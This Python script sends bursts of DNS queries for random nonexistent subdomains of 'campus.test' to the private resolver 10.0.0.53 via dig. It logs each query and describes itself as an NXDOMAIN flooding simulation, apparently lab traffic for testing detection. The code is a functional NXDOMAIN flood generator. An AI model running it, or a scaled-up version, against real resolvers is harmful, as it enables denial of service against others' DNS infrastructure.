
import argparse
import random
import string
import subprocess
import time
from datetime import datetime


DNS_SERVER = "10.0.0.53"


def random_label(length=12):
    return ''.join(
        random.choices(
            string.ascii_lowercase + string.digits,
            k=length
        )
    )


def generate_nxdomain_flood(queries, min_delay, max_delay):

    print("Starting NXDOMAIN flooding simulation")
    print(f"Number of queries: {queries}")

    for number in range(1, queries + 1):

        domain = f"{random_label()}.campus.test"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(
            f"[{timestamp}] "
            f"NXDOMAIN query {number}/{queries}: {domain}"
        )

        subprocess.run(
            [
                "dig",
                f"@{DNS_SERVER}",
                domain,
                "A",
                "+short"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        time.sleep(random.uniform(min_delay, max_delay))

    print("Completed NXDOMAIN flooding simulation")


if __name__ == "__main__":

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "--queries",
        type=int,
        default=100
    )

    parser.add_argument(
        "--min-delay",
        type=float,
        default=0.01
    )

    parser.add_argument(
        "--max-delay",
        type=float,
        default=0.05
    )

    args = parser.parse_args()

    generate_nxdomain_flood(
        args.queries,
        args.min_delay,
        args.max_delay
    )
